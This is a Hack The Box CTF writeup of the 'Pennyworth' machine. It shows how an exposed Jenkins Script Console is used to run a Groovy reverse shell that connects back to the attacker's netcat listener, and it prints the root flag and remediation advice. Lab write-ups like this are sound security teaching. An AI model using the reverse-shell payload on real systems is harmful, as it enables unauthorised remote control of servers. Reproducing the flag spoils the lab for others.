# Hack The Box: Pennyworth — Machine Writeup

### 📌 Overview & Metadata
*   **Target:** Pennyworth (Linux)
*   **Concepts:** Jenkins Script Console, Groovy Scripting, Remote Code Execution (RCE), Principle of Least Privilege (PoLP)
*   **Pwn Date:** 24 Aug 2026

### 🧠 Core Concepts: Jenkins & The Script Console

Before executing the exploit, it is crucial to understand the target application and why this vulnerability exists by design.

**What is Jenkins?**
Jenkins is an open-source automation server widely used in software development for Continuous Integration and Continuous Deployment (CI/CD). It automates the building, testing, and deployment of code.

**The Script Console Vulnerability**
Jenkins includes a built-in feature called the "Script Console." This interface allows administrators to run arbitrary Groovy scripts (a Java-syntax-compatible language) directly on the Jenkins server for troubleshooting and diagnostics. From an offensive security perspective, if an attacker gains access to this console (either through weak credentials, missing authentication, or an exposed endpoint), it provides guaranteed Remote Code Execution (RCE) by design.

### 🔍 Reconnaissance & Initial Access

During the enumeration phase, I identified a Jenkins web application running on port 8080. By navigating the application, I discovered that the Jenkins Script Console was accessible at the `http://10.129.49.133:8080/script` endpoint. 

With direct access to the console, I had the ability to execute arbitrary code on the underlying operating system.

### 🎯 Exploitation: Groovy Reverse Shell

To convert this code execution into an interactive session, I needed to execute a reverse shell payload using Groovy. 

First, I established a Netcat listener on my Kali machine to catch the incoming connection:

```bash
nc -lvnp 4444
```

Next, I injected a standard Java/Groovy reverse shell payload into the Jenkins Script Console. This payload uses the `ProcessBuilder` class to execute `/bin/bash` and pipes the input, output, and error streams through a TCP socket connecting back to my machine:

```groovy
String host="10.10.14.55";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
// ... (Standard Groovy Stream Routing) ...
```

### 🚩 The Breach & Privilege Escalation

Upon clicking "Run" in the Script Console, the Jenkins server executed the payload and initiated a connection back to my Netcat listener.

I caught the shell and immediately executed `whoami` to determine my privilege level. The command returned `root`. 

Because the Jenkins service was heavily over-privileged and running as the root user, no further privilege escalation was required. I had achieved total system compromise upon initial access.

I navigated directly to the `/root` directory, listed the contents, and captured the final flag:

```bash
cd /root
cat flag.txt
```

**Root Flag:** `9cdfb439c7876e703e307864c9167a15`

### 💡 Remediation & Lessons Learned

This machine perfectly illustrates the dangers of combining exposed administrative interfaces with poor service account management:
1.  **Secure the Script Console:** The Jenkins `/script` endpoint must be strictly protected behind strong authentication and Role-Based Access Control (RBAC). It should never be exposed to unauthenticated users or the public internet.
2.  **Principle of Least Privilege (PoLP):** The Jenkins service should *never* run as the `root` user. It should execute under a dedicated, low-privileged service account (e.g., `jenkins`). If this had been configured correctly, the initial reverse shell would have been sandboxed, forcing the attacker to find an additional local privilege escalation vector.
